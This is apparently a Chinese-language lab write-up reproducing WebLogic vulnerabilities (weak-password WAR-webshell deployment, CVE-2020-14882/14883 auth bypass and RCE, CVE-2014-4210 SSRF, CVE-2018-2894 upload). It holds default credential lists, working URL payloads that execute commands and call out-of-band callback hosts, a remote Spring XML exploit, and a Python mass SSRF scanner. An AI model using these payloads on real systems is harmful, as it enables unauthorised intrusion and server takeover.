---
title: Weblogic 弱口令&文件上传&SSRF
date: 2026-10-11
---

# Weblogic 弱口令&文件上传&SSRF

## 前言

这篇文章学习一些 Weblogic 的其他漏洞，主要是四个漏洞：

- CVE-2014-4210 SSRF
- CVE-2018-2894 任意文件上传
- CVE-2020-14882/CVE-2020-14883 未授权 RCE
- 弱口令 getshell

环境还是之前搭建的。

## 弱口令 getshell

访问 WebLogic `/console` 接口，可能存在的弱口令如下：

|    账户     |    密码     |
| :---------: | :---------: |
|   system    |  password   |
|  weblogic   |  weblogic   |
|    guest    |    guest    |
| portaladmin | portaladmin |
|    admin    |  security   |
|     joe     |  password   |
|    mary     |  password   |
|   system    |  security   |
|  wlcsystem  |  wlcsystem  |
|  wlcsystem  | sipisystem  |

更多的一些常见弱密码：

```text
weblogic1  
weblogic12  
weblogic123  
weblogic@123  
webl0gic  
weblogic#  
weblogic@
```

但是不能使用 bp 抓包去爆破，错误密码 5 次之后就会自动锁定。这个弱口令可以和任意文件上传漏洞联合利用。

### 复现

先使用弱口令登录，点击部署下的安装：

![1](https://drun1baby.top/2023/03/06/WebLogic-%E5%BC%B1%E5%8F%A3%E4%BB%A4-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-SSRF/deployAndInstall.png)

选择上载文件：

![1](https://drun1baby.top/2023/03/06/WebLogic-%E5%BC%B1%E5%8F%A3%E4%BB%A4-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-SSRF/uploadFile.png)

上传恶意 war 包，这个恶意 war 包由冰蝎生成，压缩为 zip 之后改后缀为 war的。

![1](https://drun1baby.top/2023/03/06/WebLogic-%E5%BC%B1%E5%8F%A3%E4%BB%A4-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-SSRF/EvilWarBag.png)

默认点击“下一步”，直到遇到并点击完成。

![1](https://drun1baby.top/2023/03/06/WebLogic-%E5%BC%B1%E5%8F%A3%E4%BB%A4-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-SSRF/doneUpload.png)

然后启动我们部署的 war 包。

![1](https://drun1baby.top/2023/03/06/WebLogic-%E5%BC%B1%E5%8F%A3%E4%BB%A4-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-SSRF/goEvilWar.png)

选择“为所有请求提供服务”。

![1](https://drun1baby.top/2023/03/06/WebLogic-%E5%BC%B1%E5%8F%A3%E4%BB%A4-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-SSRF/requestProvide.png)

正常启动之后：

![1](https://drun1baby.top/2023/03/06/WebLogic-%E5%BC%B1%E5%8F%A3%E4%BB%A4-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-SSRF/StartedOver.png)

成功 getshell：

![1](https://drun1baby.top/2023/03/06/WebLogic-%E5%BC%B1%E5%8F%A3%E4%BB%A4-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-SSRF/ping.png)

## CVE-2020-14882/CVE-2020-14883 未授权 RCE

### 影响版本

Oracle WebLogic Server 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0 and 14.1.1.0.0

### 漏洞原理

- CVE-2020-14883：允许未授权的用户通过目录穿越结合双重 URL 编码的方式来绕过管理控制台的权限验证访问后台。
- CVE-2020-14882：允许后台任意用户通过 HTTP 协议执行任意命令。

### 漏洞复现

主要是一下两个 CVE 的组合利用，显示未授权访问后台，然后通过后台可以执行命令的接口实现 RCE。

#### CVE-2020-14883

正常情况下，没有登录 Weblogic 的话访问 console 后台就会直接 302 跳转到`/console/login/LoginForm.jsp`登录界面。

![1](https://drun1baby.top/2023/03/06/WebLogic-%E5%BC%B1%E5%8F%A3%E4%BB%A4-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-SSRF/Redirct302.png)

但是通过目录穿越结合双重 URL 编码就能绕过认证实现未授权访问 console 后台。

```text
/console/css/%252e%252e%252fconsole.portal
```

![1](https://drun1baby.top/2023/03/06/WebLogic-%E5%BC%B1%E5%8F%A3%E4%BB%A4-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-SSRF/bypassCSS.png)

其中`%252e%252e%252f`为二次 URL 编码的`../`，通过这个就可以实现穿越路径未授权访问相关管理后台。访问后台之后发现和之前弱密码登录的页面不一样，之前的通过弱密码登录管理员账号的界面由部署功能：

![1](https://drun1baby.top/2023/03/06/WebLogic-%E5%BC%B1%E5%8F%A3%E4%BB%A4-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-SSRF/noPrevilige.png)

这时候就需要用到后台任意命令执行（CVE-2020-14883）了。

#### CVE-2020-14883

前面的 CVE 虽然可以访问后台，但是是低权限用户，无法安装应用，所以我们需要借助 CVE-2020-14883。

这个的漏洞的利用方式有两种，一是通过`com.tangosol.coherence.mvel2.sh.ShellSession`，二是通过`com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext`。

##### 方式一

```java
com.tangosol.coherence.mvel2.sh.ShellSession
```

但此利用方法只能在 Weblogic 12.2.1 及以上版本利用，因为 10.3.6 并不存在`com.tangosol.coherence.mvel2.sh.ShellSession`类。

直接访问如下 URL，即可利用`com.tangosol.coherence.mvel2.sh.ShellSession`执行命令，下面是 DNSLog 探测的 payload：

```text
http://ip:7001/console/console.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec('curl%20vnmh1ymd4u6vz2lgrt60s6zid9jz7o.oastify.com');")
```

有回显的 payload：

```text
/console/css/%252e%252e%252fconsole.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession(%27weblogic.work.ExecuteThread%20currentThread%20=%20(weblogic.work.ExecuteThread)Thread.currentThread();%20weblogic.work.WorkAdapter%20adapter%20=%20currentThread.getCurrentWork();%20java.lang.reflect.Field%20field%20=%20adapter.getClass().getDeclaredField(%22connectionHandler%22);field.setAccessible(true);Object%20obj%20=%20field.get(adapter);weblogic.servlet.internal.ServletRequestImpl%20req%20=%20(weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod(%22getServletRequest%22).invoke(obj);%20String%20cmd%20=%20req.getHeader(%22cmd%22);String[]%20cmds%20=%20System.getProperty(%22os.name%22).toLowerCase().contains(%22window%22)%20?%20new%20String[]{%22cmd.exe%22,%20%22/c%22,%20cmd}%20:%20new%20String[]{%22/bin/sh%22,%20%22-c%22,%20cmd};if(cmd%20!=%20null%20){%20String%20result%20=%20new%20java.util.Scanner(new%20java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter(%22\\A%22).next();%20weblogic.servlet.internal.ServletResponseImpl%20res%20=%20(weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod(%22getResponse%22).invoke(req);res.getServletOutputStream().writeStream(new%20weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();}%20currentThread.interrupt();
```

然后把执行的命令添加在 http 头部的 cmd 字段：

![1](https://drun1baby.top/2023/03/06/WebLogic-%E5%BC%B1%E5%8F%A3%E4%BB%A4-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-SSRF/withPayload.png)

##### 方式二

```java
com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext
```

这是一种更为通杀的方法，最早在 CVE-2019-2725 被提出，对于所有 Weblogic 版本均有效。首先，我们需要构造一个 XML 文件，并将其保存在 Weblogic 可以访问到的服务器上：

```xml
<?xml version="1.0" encoding="UTF-8" ?>
<beans xmlns="http://www.springframework.org/schema/beans"
   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg>
          <list>
            <value>bash</value>
            <value>-c</value>
            <value><![CDATA[ping nh8vcdige9vlja513ugyqowj1a70vp.oastify.com]]></value>
          </list>
        </constructor-arg>
    </bean>
</beans>
```

如果是 windows 可以尝试弹计算器，然后通过如下 URL，即可让 Weblogic 加载这个 XML，并执行其中的命令：

```text
/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext("http://example.com/rce.xml")
```

但是这个方法需要 Weblogic 的服务器能够访问到恶意 XML，在服务器不出网的时候无法利用。

这个 payload 的利用是基于 Spring 的，`com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext`是 Weblogic **重打包过的框架类**。Weblogic 内部集成了 Spring，`FileSystemXmlApplicationContext`是 Spring 的`ApplicationContext`，它的构造函数接收一个或多个 XML 配置文件路径。实例化时，它会：

1. 解析 XML 文件
2. 根据 XML 中的`<bean>`定义创建对象
3. 执行 Bean 的初始化方法、构造方法等

## CVE-2014-4210 SSRF

### 影响版本

- Oracle WebLogic Server 10.0.2, 10.3.6

### 漏洞原理

WebLogic 的 `SearchPublicReqistries.jsp` 接口存在 SSRF 漏洞，如果服务端或内网存在 Redis 未授权访问漏洞等则可以进一步打漏洞组合拳进行攻击利用。

漏洞源码：

![1](https://drun1baby.top/2023/03/06/WebLogic-%E5%BC%B1%E5%8F%A3%E4%BB%A4-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-SSRF/SSRFOrigin.png)

### 漏洞利用

SSRF 漏洞存在于 `http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp`，我们在brupsuite下测试该漏洞。访问一个可以访问的 IP:PORT，如 `http://127.0.0.1:7001`：

```text
/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://127.0.0.1:7001
```

探测 7001 端口结果如下，错误信息是：

```text
weblogic.uddi.client.structures.exception.XML_SoapException: The server at http://127.0.0.1:7001 returned a 404 error code &#40;Not Found&#41;.  Please ensure that your URL is correct, and the web service has deployed without error.
```

![1](https://drun1baby.top/2023/03/06/WebLogic-%E5%BC%B1%E5%8F%A3%E4%BB%A4-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-SSRF/Detect7001.png)

探测 7000 端口：

![1](https://drun1baby.top/2023/03/06/WebLogic-%E5%BC%B1%E5%8F%A3%E4%BB%A4-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-SSRF/error3306.png)

此时错误信息：

```text
weblogic.uddi.client.structures.exception.XML_SoapException: Tried all: &#39;1&#39; addresses, but could not connect over HTTP to server: &#39;127.0.0.1&#39;, port: &#39;7000&#39;
```

根据两者不同的回显，可以用来探测资产。

自动化检测 weblogic 的 ssrf（需要在当前目录下创建一个 domain.txt 文件，里面就写 Weblogic 的访问方式，保存为 `check_weblogic_ssrf.py`）

domain.txt：

```text
http://your-ip:7001/
```

**check_weblogic_ssrf.py**：

```python
#!/usr/bin/env python  
 
# -*- coding: utf-8 -*-
import re
import sys
import Queue
import requests
import threading
from requests.packages.urllib3.exceptions import InsecureRequestWarning
 
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
queue = Queue.Queue()
mutex = threading.Lock()
 
class Test(threading.Thread):
    def __init__(self, queue):
        threading.Thread.__init__(self)
        self.queue = queue
        
    def check(self,domain,ip):
        payload = "uddiexplorer/SearchPublicRegistries.jsp?operator={ip}&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search".format(ip=ip)
        url = domain + payload
        try:
            html = requests.get(url=url, timeout=15, verify=False).content
            m = re.search('weblogic.uddi.client.structures.exception.XML_SoapException',html)
            if m:
                mutex.acquire()
                with open('ssrf1.txt','a+') as f:
                    print "%s has weblogic ssrf." % domain
                    f.write("%s has weblogic ssrf." % domain)
                mutex.release()
        except Exception,e:
            print e
            
    def get_registry(self,domain):
        payload = 'uddiexplorer/SetupUDDIExplorer.jsp'
        url = domain + payload
        try:
            html = requests.get(url=url, timeout=15, verify=False).content
            m = re.search('<i>For example: (.*?)/uddi/uddilistener.*?</i>',html)
            if m:
                return m.group(1)
        except Exception,e:
            print e
 
    def run(self):
        while not self.queue.empty():
            domain = self.queue.get()
            mutex.acquire()
            print domain
            mutex.release()
            ip = self.get_registry(domain)
            self.check(domain,ip)
            self.queue.task_done()
if __name__ == '__main__':
    with open('domain.txt','r') as f:
        lines = f.readlines()
    for line in lines:
        queue.put(line.strip())
    for x in xrange(1,50):
        t = Test(queue)
        t.setDaemon(True)
        t.start()
    queue.join()
```

## CVE-2018-2894 任意文件上传

### 影响版本

10.3.6，12.1.3，12.2.1.2，12.2.1.3

### 漏洞原理

Weblogic 如果开启了 Web 服务测试页（默认不开启），则分别会在`/ws_utc/begin.do`以及`/ws_utc/config.do`这两个页面存在任意上传getshell漏洞

### 漏洞复现

登录上 console，点 `base_domain`，在 “配置” -> “一般信息” -> “高级” 中开启 “启用 Web 服务测试页” 选项。

![1](https://drun1baby.top/2023/03/06/WebLogic-%E5%BC%B1%E5%8F%A3%E4%BB%A4-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-SSRF/domainFirst.png)

本地环境没成功跑起来，可以看看[Weblogic 任意文件上传漏洞（CVE-2018-2894）复现-CSDN博客](https://blog.csdn.net/weixin_51198941/article/details/134193310)































